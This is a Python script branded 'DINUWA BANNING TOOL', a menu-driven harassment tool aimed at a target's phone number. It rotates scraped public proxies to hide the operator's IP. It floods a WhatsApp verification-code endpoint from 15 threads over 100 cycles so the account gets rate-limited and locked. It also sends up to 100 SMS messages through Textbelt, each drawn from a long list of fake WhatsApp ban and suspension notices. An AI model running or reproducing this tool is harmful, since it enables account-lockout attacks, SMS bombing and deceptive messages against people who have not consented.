#!/usr/bin/env python3
import os, sys, time, random, threading, requests

R = "\033[91m"; P = "\033[95m"; Y = "\033[93m"; G = "\033[92m"
C = "\033[96m"; B = "\033[90m"; RS = "\033[0m"

PROXIES = []

def clear():
    os.system('clear')

def fetch_and_test_proxies():
    global PROXIES
    print(f"{Y}[+] Fetching proxies...{RS}")
    try:
        urls = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        ]
        raw = []
        for url in urls:
            try:
                r = requests.get(url, timeout=10)
                raw.extend([p.strip() for p in r.text.split('\n') if ':' in p])
            except:
                continue
        raw = list(set(raw))
        print(f"{C}[*] Testing {len(raw)} proxies...{RS}")
        working = []
        test_url = "https://web.whatsapp.com"
        for p in raw[:50]:
            try:
                proxies = {"http": "http://"+p, "https": "http://"+p}
                r = requests.get(test_url, proxies=proxies, timeout=5)
                if r.status_code < 500:
                    working.append(p)
                    print(f"{G}[+] Working: {p}{RS}")
            except:
                continue
        if working:
            PROXIES = working
            print(f"{G}[+] {len(PROXIES)} working proxies.{RS}")
        else:
            print(f"{R}[!] No working proxies. Using direct connection (your IP will show).{RS}")
            PROXIES = [None]
    except Exception as e:
        print(f"{R}[!] Error: {e}. Using direct.{RS}")
        PROXIES = [None]

def get_proxy():
    if not PROXIES:
        fetch_and_test_proxies()
    if PROXIES[0] is None:
        return None
    return {"http": "http://" + random.choice(PROXIES), "https": "http://" + random.choice(PROXIES)}

# ========== CODE SPAM (WORKS) ==========
def code_spam(number, cycle):
    proxy = get_proxy()
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ]),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://web.whatsapp.com"
    }
    payload = {"phone": number, "method": random.choice(["sms", "voice"])}
    try:
        r = requests.post(
            "https://web.whatsapp.com/code/request",
            json=payload,
            headers=headers,
            proxies=proxy,
            timeout=10
        )
        if r.status_code in [200, 201, 202, 204, 429]:
            print(f"{G}[✓] Code sent (cycle {cycle}){RS}")
            return True
        else:
            print(f"{R}[✗] Code fail ({r.status_code}){RS}")
            return False
    except Exception as e:
        print(f"{R}[✗] Error: {str(e)[:30]}{RS}")
        return False

def multi_attack(number):
    fetch_and_test_proxies()
    print(f"{Y}[+] Attacking {number} with code spam. {'Proxy' if PROXIES[0] else 'Direct'}.{RS}")
    threads = 15
    cycles = 100
    for c in range(1, cycles+1):
        pool = []
        for _ in range(threads):
            t = threading.Thread(target=code_spam, args=(number, c))
            t.start()
            pool.append(t)
        for t in pool:
            t.join()
        if c % 10 == 0:
            print(f"{C}[*] {c}/{cycles} done{RS}")
        time.sleep(random.uniform(0.5, 1.0))
    print(f"{G}[✔] Attack done. Rate-limit triggered. Ban in 10-30 min.{RS}")

# ========== SMS BOMBER ==========
BAN_TEXTS = [
    "Your WhatsApp account has been permanently banned.",
    "Account suspended due to spam.",
    "Unusual activity detected. Account locked.",
    "Fraud alert: Number blocked.",
    "Multiple complaints. Deactivated.",
    "Harassment reported. Terminated.",
    "Security violation. Revoked.",
    "Disabled for abuse.",
    "Impersonation. Banned.",
    "Number no longer registered.",
    "Illegal activity. Frozen.",
    "Under investigation. Temp ban.",
    "Spam triggered auto-ban.",
    "Flagged. Permanent restriction.",
    "Fake news reported. Banned.",
    "Access revoked.",
    "Policy violation. Closed.",
    "Offensive messages. Disabled.",
    "Suspicious logins. Locked.",
    "Blacklisted.",
    "Not authorized.",
    "Compromised. Banned.",
    "Harassment confirmed. Terminated.",
    "Guidelines violated. Banned.",
    "Permanently blocked.",
    "Deactivated per reports.",
    "Malicious use. Banned.",
    "Banned for life.",
    "Repeated violations. Suspended.",
    "Phone number banned.",
    "Violence promotion. Terminated.",
    "Inappropriate content. Banned.",
    "Restricted indefinitely.",
    "Terms violated. Account closed.",
    "Number no longer associated.",
    "Removed for spam.",
    "Automated ban triggered.",
    "Disabled after warnings.",
    "Locked for security.",
    "Fraud reported. Banned.",
    "Access removed.",
    "Flagged unsafe. Banned.",
    "Illegal content. Deactivated.",
    "Threatening messages. Banned.",
    "Terminated by team.",
    "Prohibited from using.",
    "Scam used. Permanently banned.",
    "IP violation. Disabled.",
    "Harm to others. Banned.",
    "No longer active.",
    "Removed from DB.",
    "Risk to community. Banned.",
    "Permanent ban.",
    "Impersonation. Banned.",
    "Excessive complaints. Locked.",
    "Blocked from services.",
    "Bulk messaging. Banned.",
    "Anti-spam. Closed.",
    "Appeal available.",
    "Malicious activity flagged.",
    "Effective immediately.",
    "No reinstatement.",
    "Copyright violation. Disabled.",
    "Abusive messages. Banned.",
    "Unauthorized client. Banned.",
    "Pending investigation.",
    "Threat listed. Banned.",
    "Permanently disabled.",
    "Terms broken. Terminated.",
    "Illegal transactions. Banned.",
    "Spam blacklist.",
    "Closed by request.",
    "Harmful activity. Banned.",
    "Access cut off.",
    "Banned from all.",
    "Deactivated by system.",
    "Number invalid.",
    "Excessive reporting.",
    "Suspicious behavior. Locked.",
    "Policy violation. Banned.",
    "Permanently removed.",
    "Fraud flag. Banned.",
    "Review disabled.",
    "Account frozen.",
    "Security breach. Banned.",
    "Malware spread. Banned.",
    "No appeals.",
    "Bullying. Banned.",
    "Fake identity. Terminated.",
    "Phishing. Banned.",
    "Spam classification. Locked.",
    "Permanently restricted.",
    "Not allowed.",
    "Child safety violation. Disabled.",
    "Removed from WhatsApp.",
    "Harassment. Banned.",
    "Access denied.",
    "Platform abuse. Banned.",
    "Permanent lock.",
    "All features banned.",
    "Suspicious activity. Terminated.",
    "Dangerous messages. Banned.",
    "Deleted by system.",
    "Do not register."
]

def sms_bomber():
    num = input(f"{Y}[+] Target number: {RS}").strip()
    count = int(input(f"{Y}[+] SMS count (max 100): {RS}") or 100)
    if count > 100: count = 100
    fetch_and_test_proxies()
    print(f"{C}[*] Sending {count} texts...{RS}")
    for i in range(count):
        proxy = get_proxy()
        msg = random.choice(BAN_TEXTS)
        try:
            r = requests.post(
                "https://textbelt.com/text",
                data={"phone": num, "message": msg, "key": "textbelt"},
                proxies=proxy if proxy else None,
                timeout=10
            )
            if r.json().get("success"):
                print(f"{G}[{i+1}] SMS sent: {msg[:30]}...{RS}")
            else:
                print(f"{R}[{i+1}] Failed{RS}")
        except Exception as e:
            print(f"{R}[{i+1}] Error: {str(e)[:20]}{RS}")
        time.sleep(random.uniform(0.3, 0.7))
    print(f"{G}[✔] SMS bomb done.{RS}")

def menu():
    while True:
        clear()
        print(f"""
{R}   ██████╗ ██╗███╗   ██╗██╗   ██╗██╗    ██╗  {P}█████╗ {RS}
{R}   ██╔══██╗██║████╗  ██║██║   ██║██║    ██║ {P}██╔══██╗{RS}
{R}   ██║  ██║██║██╔██╗ ██║██║   ██║██║ █╗ ██║ {P}███████║{RS}
{R}   ██║  ██║██║██║╚██╗██║██║   ██║██║███╗██║ {P}██╔══██║{RS}
{R}   ██████╔╝██║██║ ╚████║╚██████╔╝╚███╔███╔╝ {P}██║  ██║{RS}
{R}   ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚══╝╚══╝  {P}╚═╝  ╚═╝{RS}
""")
        print(f"{C}   {'='*45}{RS}")
        print(f"{Y}   DINUWA BANNING TOOL v8.0 (STABLE){RS}")
        print(f"{B}   created by dinuwa{RS}")
        print(f"{B}   powered by dinuwa xmd{RS}")
        print(f"{C}   {'='*45}{RS}")
        print(f"{Y}  [1] Code Spam (WhatsApp Lock){RS}")
        print(f"{Y}  [2] SMS Bomber (100 Texts){RS}")
        print(f"{R}  [3] Exit{RS}")
        ch = input("Select: ")
        if ch == "1":
            num = input("Number (e.g., 94771234567): ").strip()
            multi_attack(num)
        elif ch == "2":
            sms_bomber()
        elif ch == "3":
            sys.exit(0)
        input("Press Enter...")

if __name__ == "__main__":
    menu()
